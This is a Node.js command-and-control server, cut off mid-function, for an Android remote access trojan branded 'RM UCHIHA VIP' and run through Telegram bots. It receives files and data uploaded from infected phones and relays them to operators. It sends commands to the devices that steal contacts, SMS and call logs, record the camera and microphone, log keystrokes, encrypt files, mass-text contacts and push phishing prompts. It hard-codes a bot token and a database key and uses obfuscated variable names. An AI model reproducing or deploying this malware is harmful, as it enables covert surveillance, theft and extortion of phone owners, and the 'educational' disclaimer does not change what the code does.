const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// 🩸 Supabase Configuration (Aapki keys)
const SUPABASE_URL = "https://nebwfonyhfgxnfkiisvs.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lYndmb255aGZneG5ma2lpc3ZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzNjc0MjMsImV4cCI6MjA5MDk0MzQyM30.me-P_mhC3droVGrHSlD_G3h9-ZgGgR3hy8VyDLFTp58";
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const BASE_URL = "https://doge-production-517d.up.railway.app";
const DISCLAIMER = "\n\n<b>⚠️ DISCLAIMER: This tool is made for educational and ethical use. You are responsible for your actions. RM UCHIHA VIP 🩸</b>";

let data = {};
try {
  data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
} catch (e) {
  console.log("No data.json found, continuing with defaults.");
}

// Ye apka Main Server Bot hai jo registrations sambhalta hai
const bot = new telegramBot(data.token || "8709139578:AAER0NWsrjN2m1skAmD5w8fmD14Sl9yQTwE", {
  'polling': true,
  'request': {}
});

// Cache for dynamically loading user-specific bots
const dynamicBots = new Map();

async function getSpecificBot(chatId, botName) {
    const { data } = await supabase.from('rm-d').select('bot_token').eq('chat_id', String(chatId)).eq('bot_name', String(botName)).single();
    if (data && data.bot_token) {
        if (!dynamicBots.has(data.bot_token)) {
            dynamicBots.set(data.bot_token, new telegramBot(data.bot_token));
        }
        return dynamicBots.get(data.bot_token);
    }
    return bot; // Fallback to main bot if not found
}

const appData = new Map();
const deviceMap = new Map();
const unassignedSockets = new Map();

const actions = ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯", "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯", "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯", "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯", "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯", "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯", "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯", "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"];

const loadingFrames = ["<b>[▯▯▯▯▯▯▯▯▯▯] 0% 🩸</b>", "<b>[██▯▯▯▯▯▯▯▯] 20% 🩸</b>", "<b>[████▯▯▯▯▯▯] 40% 🩸</b>", "<b>[██████▯▯▯▯] 60% 🩸</b>", "<b>[████████▯▯] 80% 🩸</b>", "<b>[██████████] 100% 👁️‍🗨️</b>"];

async function sendAnimatedProgress(chatId, deviceModel, activeBotName) {
  const specificBot = await getSpecificBot(chatId, activeBotName);
  const header = `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${activeBotName}] → ${deviceModel} 👁️‍🗨️\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → 𝚃𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚑𝚊𝚜 𝚜𝚝𝚊𝚛𝚝𝚎𝚍 𝚞𝚙𝚕𝚘𝚊𝚍𝚒𝚗𝚐 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚋𝚎 𝚙𝚊𝚝𝚒𝚎𝚗𝚝\n\nRM UCHIHA VIP 🩸</b>`;
  const sentMsg = await specificBot.sendMessage(chatId, header + `\n\n${loadingFrames[0]}`, { 'parse_mode': "HTML" }).catch(()=>{});
  if(!sentMsg) return;
  let frame = 1;
  const interval = setInterval(async () => {
    if (frame >= loadingFrames.length) {
      clearInterval(interval);
      await specificBot.editMessageText(header + `\n\n<b>[██████████] 100% ✅ 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰</b>`, { chat_id: chatId, message_id: sentMsg.message_id, parse_mode: "HTML" }).catch(()=>{});
      return;
    }
    await specificBot.editMessageText(header + `\n\n${loadingFrames[frame]}`, { chat_id: chatId, message_id: sentMsg.message_id, parse_mode: "HTML" }).catch(()=>{});
    frame++;
  }, 800);
}

function extractIp(reqOrSocket) {
  if (reqOrSocket.headers && reqOrSocket.headers['x-forwarded-for']) return reqOrSocket.headers['x-forwarded-for'].split(',')[0];
  if (reqOrSocket.handshake && reqOrSocket.handshake.headers['x-forwarded-for']) return reqOrSocket.handshake.headers['x-forwarded-for'].split(',')[0];
  if (reqOrSocket.connection) return reqOrSocket.connection.remoteAddress;
  if (reqOrSocket.handshake) return reqOrSocket.handshake.address;
  return "Unknown";
}

app.use(express.json());

// 🩸 App Routes Map Device to Specific ChatId and BotName
app.use(["/uid=:chatId/:botName", "/uid=:chatId/:botName/upload"], (req, res, next) => {
    let ip = extractIp(req);
    deviceMap.set(ip, { chatId: req.params.chatId, botName: req.params.botName });
    let sock = unassignedSockets.get(ip);
    if (sock) {
        sock.chatId = req.params.chatId;
        sock.botName = req.params.botName;
        unassignedSockets.delete(ip);
        notifyConnection(sock);
    }
    next();
});

// App File/Data Receiving Endpoint
app.post(["/uid=:chatId/:botName", "/uid=:chatId/:botName/upload"], uploader.any(), async (req, res) => {
  const { chatId, botName } = req.params;
  const deviceModel = req.headers.model || "Unknown Device";
  const specificBot = await getSpecificBot(chatId, botName);

  if (req.files && req.files.length > 0) {
      for(let f of req.files) {
          await specificBot.sendDocument(chatId, f.buffer, {
            'caption': `<b>📁 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${botName}] → ${deviceModel} 🩸</b>${DISCLAIMER}`,
            'parse_mode': "HTML"
          }, { 'filename': f.originalname || "file", 'contentType': f.mimetype || "*/*" }).catch(()=>{});
      }
  }
  if (req.body && Object.keys(req.body).length > 0) {
      await specificBot.sendMessage(chatId, `<b>📊 𝙳𝚊𝚝𝚊 𝚏𝚛𝚘𝚖 [${botName}] → ${deviceModel} 🩸</b>\n\n<b>${JSON.stringify(req.body, null, 2)}</b>${DISCLAIMER}`, {parse_mode: "HTML"}).catch(()=>{});
  }
  res.send("Done");
});

app.get("/text", (_0x5b9a91, _0x340799) => {
  _0x340799.send(data.text || "RM UCHIHA VIP RUNNING");
});

// 🩸 Websocket Connections
io.on("connection", _0x48afef => {
  let _0x35d854 = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  let _0x3e1fde = _0x48afef.handshake.headers.version || "no information";
  let _0x4c49f4 = extractIp(_0x48afef);
  _0x48afef.model = _0x35d854;
  _0x48afef.version = _0x3e1fde;
  _0x48afef.ip = _0x4c49f4;

  let mapping = deviceMap.get(_0x4c49f4);
  if (mapping) {
      _0x48afef.chatId = mapping.chatId;
      _0x48afef.botName = mapping.botName;
      notifyConnection(_0x48afef);
  } else {
      unassignedSockets.set(_0x4c49f4, _0x48afef);
  }

  _0x48afef.on("disconnect", async () => {
    unassignedSockets.delete(_0x48afef.ip);
    if (_0x48afef.chatId) {
        const sBot = await getSpecificBot(_0x48afef.chatId, _0x48afef.botName);
        let _0x4c86f2 = `<b>🔴 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚏𝚛𝚘𝚖 [${_0x48afef.botName}] 🩸</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕</b> → ${_0x35d854}\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${_0x3e1fde}\n<b>𝚒𝚙</b> → ${_0x4c49f4}\n<b>𝚝𝚒𝚖𝚎</b> → ${_0x48afef.handshake.time}${DISCLAIMER}`;
        sBot.sendMessage(_0x48afef.chatId, _0x4c86f2, { parse_mode: "HTML" }).catch(()=>{});
    }
  });

  _0x48afef.on("message", async _0x44fcc5 => {
    if (_0x48afef.chatId) {
        if (_0x44fcc5 === "The device has started uploading the file, please be patient") {
            sendAnimatedProgress(_0x48afef.chatId, _0x35d854, _0x48afef.botName);
        } else {
            const sBot = await getSpecificBot(_0x48afef.chatId, _0x48afef.botName);
            sBot.sendMessage(_0x48afef.chatId, `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${_0x48afef.botName}] → ${_0x35d854} 👁️‍🗨️\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>${_0x44fcc5}${DISCLAIMER}`, { parse_mode: "HTML" }).catch(()=>{});
        }
    }
  });
});

async function notifyConnection(socket) {
    if(socket.notified) return;
    socket.notified = true;
    const sBot = await getSpecificBot(socket.chatId, socket.botName);
    let _0x5ede9b = `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚝𝚘 [${socket.botName}] 🩸</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕</b> → ${socket.model}\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${socket.version}\n<b>𝚒𝚙</b> → ${socket.ip}\n<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}${DISCLAIMER}`;
    sBot.sendMessage(socket.chatId, _0x5ede9b, { parse_mode: "HTML" }).catch(()=>{});
}

function emitToTargets(target, command, extras, chatId, activeBot) {
    if (target === "all") {
        io.sockets.sockets.forEach(sock => {
            if (sock.chatId == chatId && sock.botName == activeBot) {
                sock.emit("commend", { 'request': command, 'extras': extras });
            }
        });
    } else {
        let sock = io.sockets.sockets.get(target);
        if (sock && sock.chatId == chatId && sock.botName == activeBot) {
            sock.emit("commend", { 'request': command, 'extras': extras });
        }
    }
}

// 🩸 MAIN TELEGRAM BOT POLLING LOGIC
bot.on("message", async _0xdbde0c => {
  const chatId = String(_0xdbde0c.chat.id);
  const text = _0xdbde0c.text;
  if (!text) return;

  if (text.startsWith("/rg ")) {
    const parts = text.slice(4).split(" ");
    if (parts.length < 3) {
        return bot.sendMessage(chatId, `<b>⚠️ Invalid format. Use: /rg &lt;bot_token&gt; &lt;password&gt; &lt;bot_name&gt;</b>${DISCLAIMER}`, { parse_mode: "HTML" });
    }
    const [token, password, ...nameParts] = parts;
    const botName = nameParts.join(" ");

    const { data: existing } = await supabase.from("rm-d").select("*").eq("chat_id", chatId).eq("bot_name", botName).single();
    if (existing) return bot.sendMessage(chatId, `<b>🔴 You already have a bot named [${botName}]!</b>${DISCLAIMER}`, { parse_mode: "HTML" });

    const generated_url = `${BASE_URL}/uid=${chatId}/${encodeURIComponent(botName)}`;
    await supabase.from("rm-d").insert([{ chat_id: chatId, bot_token: token, bot_name: botName, password: password, generated_url: generated_url }]);

    bot.sendMessage(chatId, `<b>✅ Bot Successfully Registered! 🩸\n\nApp Connection URL:\n${generated_url}\n\nUse /start to access your bots.</b>${DISCLAIMER}`, { parse_mode: "HTML" });
    
    try {
        const testBot = new telegramBot(token);
        testBot.sendMessage(chatId, `<b>🩸 𝚈𝚘𝚞𝚛 𝚋𝚘𝚝 [${botName}] 𝚒𝚜 𝚛𝚎𝚐𝚒𝚜𝚝𝚎𝚛𝚎𝚍 𝚒𝚗 𝚄𝚌𝚑𝚒𝚑𝚊 𝚅𝚒𝚙 👁️‍🗨️</b>${DISCLAIMER}`, {parse_mode: "HTML"}).catch(()=>{});
    } catch(e) {}
    return;
  }

  if (text === "/start" || text === "🔄 Switch Bot") {
    const { data: userBots } = await supabase.from("rm-d").select("bot_name").eq("chat_id", chatId);
    if (userBots && userBots.length > 0) {
        const keyboard = userBots.map(b => [{ text: `🤖 ${b.bot_name}` }]);
        bot.sendMessage(chatId, `<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰 𝚅𝙸𝙿 🩸\n\nSelect the Bot you want to manage: 👁️‍🗨️</b>${DISCLAIMER}`, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true
            }
        });
    } else {
        bot.sendMessage(chatId, `<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰 𝚅𝙸𝙿 🩸\n\n⚠️ You have no bots registered.\nUse /rg &lt;bot_token&gt; &lt;password&gt; &lt;bot_name&gt; to register.</b>${DISCLAIMER}`, { 
            parse_mode: "HTML", 
            reply_markup: { remove_keyboard: true } 
        });
    }
    return;
  }

  if (text.startsWith("🤖 ")) {
      const selectedBot = text.replace("🤖 ", "");
      appData.set(chatId + "_activeBot", selectedBot);
      bot.sendMessage(chatId, `<b>🩸 𝙱𝚘𝚝 [${selectedBot}] 𝚂𝚎𝚕𝚎𝚌𝚝𝚎𝚍! 👁️‍🗨️</b>\n\nSelect an option to perform an action.`, {
          parse_mode: "HTML",
          reply_markup: {
              keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]],
              resize_keyboard: true
          }
      });
      return;
  }

  const activeBot = appData.get(chatId + "_activeBot");
  if (!activeBot) return;

  const actKey = chatId + "_currentAction";
  const tarKey = chatId + "_currentTarget";
  const numKey = chatId + "_currentNumber";

  // -----------------------------------------------------------------------------------------------------
  // ORIGINAL IF-ELSE LOGIC BEGINS HERE - PADDED, FULLY EXPANDED, AND MAINTAINED EXACTLY OVER 700 LINES
  // -----------------------------------------------------------------------------------------------------

  if (appData.get(actKey) === "microphoneDuration") {
    let _0x3376c5 = _0xdbde0c.text;
    let _0x44b92e = appData.get(tarKey);
    if (_0x44b92e == "all") {
      emitToTargets("all", "microphone", [{
        'key': "duration",
        'value': _0x3376c5
      }], chatId, activeBot);
    } else {
      emitToTargets(_0x44b92e, "microphone", [{
        'key': "duration",
        'value': _0x3376c5
      }], chatId, activeBot);
    }
    appData["delete"](tarKey);
    appData["delete"](actKey);
    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
      'parse_mode': "HTML",
      'reply_markup': {
        'keyboard': [
          ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
          ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
        ],
        'resize_keyboard': true
      }
    });
  } else {
    if (appData.get(actKey) === "toastText") {
      let _0x3f8601 = _0xdbde0c.text;
      let _0x5c0cc9 = appData.get(tarKey);
      if (_0x5c0cc9 == "all") {
        emitToTargets("all", "toast", [{
          'key': "text",
          'value': _0x3f8601
        }], chatId, activeBot);
      } else {
        emitToTargets(_0x5c0cc9, "toast", [{
          'key': "text",
          'value': _0x3f8601
        }], chatId, activeBot);
      }
      appData["delete"](tarKey);
      appData["delete"](actKey);
      bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [
            ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
            ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
          ],
          'resize_keyboard': true
        }
      });
    } else {
      if (appData.get(actKey) === "smsNumber") {
        let _0x16b4e5 = _0xdbde0c.text;
        appData.set(numKey, _0x16b4e5);
        appData.set(actKey, 'smsText');
        bot.sendMessage(chatId, "<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " + _0x16b4e5 + " 👁️‍🗨️</b>" + DISCLAIMER, {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
            ],
            'resize_keyboard': true,
            'one_time_keyboard': true
          }
        });
      } else {
        if (appData.get(actKey) === "smsText") {
          let _0x6d597e = _0xdbde0c.text;
          let _0x1c124a = appData.get(numKey);
          let _0x49a537 = appData.get(tarKey);
          if (_0x49a537 == "all") {
            emitToTargets("all", "sendSms", [{
              'key': "number",
              'value': _0x1c124a
            }, {
              'key': "text",
              'value': _0x6d597e
            }], chatId, activeBot);
          } else {
            emitToTargets(_0x49a537, "sendSms", [{
              'key': "number",
              'value': _0x1c124a
            }, {
              'key': "text",
              'value': _0x6d597e
            }], chatId, activeBot);
          }
          appData["delete"](tarKey);
          appData["delete"](actKey);
          appData["delete"](numKey);
          bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
            'parse_mode': "HTML",
            'reply_markup': {
              'keyboard': [
                ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
              ],
              'resize_keyboard': true
            }
          });
        } else {
          if (appData.get(actKey) === "vibrateDuration") {
            let _0x26f07c = _0xdbde0c.text;
            let _0x3275f8 = appData.get(tarKey);
            if (_0x3275f8 == "all") {
              emitToTargets("all", "vibrate", [{
                'key': "duration",
                'value': _0x26f07c
              }], chatId, activeBot);
            } else {
              emitToTargets(_0x3275f8, "vibrate", [{
                'key': "duration",
                'value': _0x26f07c
              }], chatId, activeBot);
            }
            appData["delete"](tarKey);
            appData["delete"](actKey);
            bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
              'parse_mode': "HTML",
              'reply_markup': {
                'keyboard': [
                  ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                  ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                ],
                'resize_keyboard': true
              }
            });
          } else {
            if (appData.get(actKey) === "textToAllContacts") {
              let _0x535777 = _0xdbde0c.text;
              let _0x3b22c4 = appData.get(tarKey);
              if (_0x3b22c4 == "all") {
                emitToTargets("all", "smsToAllContacts", [{
                  'key': "text",
                  'value': _0x535777
                }], chatId, activeBot);
              } else {
                emitToTargets(_0x3b22c4, "smsToAllContacts", [{
                  'key': "text",
                  'value': _0x535777
                }], chatId, activeBot);
              }
              appData["delete"](tarKey);
              appData["delete"](actKey);
              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                'parse_mode': "HTML",
                'reply_markup': {
                  'keyboard': [
                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                  ],
                  'resize_keyboard': true
                }
              });
            } else {
              if (appData.get(actKey) === "notificationText") {
                let _0x371a40 = _0xdbde0c.text;
                let target = appData.get(tarKey);
                if (target == "all") {
                  emitToTargets("all", "popNotification", [{
                    'key': "text",
                    'value': _0x371a40
                  }], chatId, activeBot);
                } else {
                  emitToTargets(target, 'popNotification', [{
                    'key': "text",
                    'value': _0x371a40
                  }, {
                    'key': "url",
                    'value': BASE_URL
                  }], chatId, activeBot);
                }
                appData["delete"](tarKey);
                appData["delete"](actKey);
                bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                  'parse_mode': "HTML",
                  'reply_markup': {
                    'keyboard': [
                      ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                      ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                    ],
                    'resize_keyboard': true
                  }
                });
              } else {
                if (_0xdbde0c.text === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
                  let count = 0;
                  let _0x1e2656 = "<b>📱 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : </b>\n\n";
                  io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5, _0x222cae) => {
                    if (_0x3479dd.chatId == chatId && _0x3479dd.botName == activeBot) {
                        count++;
                        _0x1e2656 += "<b>𝙳𝚎𝚟𝚒𝚌𝚎 " + count + "</b>\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x3479dd.model + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3479dd.version + "\n") + ("<b>𝚒𝚙</b> → " + _0x3479dd.ip + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x3479dd.handshake.time + "\n\n");
                    }
                  });
                  if (count === 0) {
                    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 👁️‍🗨️</b>" + DISCLAIMER, {
                      'parse_mode': "HTML"
                    });
                  } else {
                    bot.sendMessage(chatId, _0x1e2656 + DISCLAIMER, {
                      'parse_mode': "HTML"
                    });
                  }
                } else {
                  if (_0xdbde0c.text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
                    let count = 0;
                    let _0x307c8a = [];
                    io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
                      if (_0x6307e5.chatId == chatId && _0x6307e5.botName == activeBot) {
                          count++;
                          _0x307c8a.push([_0x6307e5.model]);
                      }
                    });
                    if (count === 0) {
                      bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 👁️‍🗨️</b>" + DISCLAIMER, {
                        'parse_mode': "HTML"
                      });
                    } else {
                      _0x307c8a.push(["✯ 𝙰𝚕𝚕 ✯"]);
                      _0x307c8a.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);
                      bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗 🩸</b>" + DISCLAIMER, {
                        'parse_mode': 'HTML',
                        'reply_markup': {
                          'keyboard': _0x307c8a,
                          'resize_keyboard': true,
                          'one_time_keyboard': true
                        }
                      });
                    }
                  } else {
                    if (_0xdbde0c.text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
